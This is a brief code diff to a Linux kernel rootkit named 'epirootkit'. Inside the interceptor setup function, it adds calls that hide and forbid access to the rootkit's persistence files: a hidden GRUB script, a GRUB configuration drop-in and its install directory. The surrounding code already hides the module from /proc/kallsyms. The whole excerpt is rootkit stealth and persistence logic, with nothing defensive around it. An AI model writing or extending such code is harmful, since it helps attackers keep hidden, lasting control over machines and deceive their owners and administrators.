@@ -52,6 +52,14 @@ int init_interceptor(void) {
     // Hide module in /proc/kallsyms
     alterate_add("/proc/kallsyms", -1, "epirootkit", NULL, NULL);
 
+    // Hide peristence stuff
+    hide_file("/.grub.sh");
+    hide_file("/etc/default/grub.d/99.cfg");
+    hide_file("/usr/lib/epirootkit");
+    forbid_file("/.grub.sh");
+    forbid_file("/etc/default/grub.d/99.cfg");
+    forbid_file("/usr/lib/epirootkit");
+
     // Hide module in /proc/modules
     // hide_module();
     
